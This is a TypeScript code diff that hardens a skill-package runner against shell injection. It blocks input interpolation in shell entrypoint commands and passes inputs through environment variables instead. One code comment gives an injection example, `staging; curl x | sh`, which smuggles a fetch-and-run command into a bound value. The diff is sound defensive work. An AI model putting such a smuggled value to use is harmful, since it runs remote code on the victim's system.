@@ -466,6 +466,24 @@ export async function runSkillPackage(
       );
     }
 
+    // The same argument, applied to the mechanism global playbooks arrived with. A bound input
+    // spliced into a command STRING is syntax rather than a value: `deploy ${inputs.target}` with
+    // `target` bound to `staging; curl x | sh` is two commands, and the quoting that would make it
+    // one is the quoting the check above already refuses to guess.
+    //
+    // It matters more here than for runtime args, because a binding comes from a PROJECT's config.
+    // Without this, a repository could choose what an already-approved global playbook runs, and
+    // approval would no longer cover everything that decides the command. Script entrypoints take
+    // an args ARRAY and are unaffected -- which is why the documented example is one.
+    if (entrypoint.type === 'shell' && /\$\{inputs\./.test(entrypoint.command)) {
+      throw new Error(
+        `Skill "${name}" entrypoint "${nameToRun}" is a shell command and cannot interpolate `
+        + 'inputs safely: a bound value would be spliced into the command as syntax, and a project '
+        + 'binding decides that value. Read the inputs from KNOWL_SKILL_INPUT_<NAME> in the '
+        + 'command, or use a script entrypoint, whose arguments are passed as an array.',
+      );
+    }
+
     // A human approved these exact bytes for this entrypoint, or nothing runs. Checked here
     // rather than at the call sites because this is the only path that spawns a process.
     const trustRoot = skill.layer === 'global' ? globalSkillsRoot() : projectRoot;
@@ -484,6 +502,12 @@ export async function runSkillPackage(
     }
 
     const env = skillEnvironment(projectRoot, skill);
+    // Bound inputs, so the refusal above names a route that exists. An environment value is read
+    // by the process rather than parsed by the shell that launched it, so a metacharacter in one
+    // is a character, not a command.
+    for (const [inputName, value] of Object.entries(inputValues)) {
+      env[`KNOWL_SKILL_INPUT_${inputName.replace(/[^A-Za-z0-9]/g, '_').toUpperCase()}`] = value;
+    }
 
     let child: ReturnType<typeof spawnSync>;
     let commandText: string;
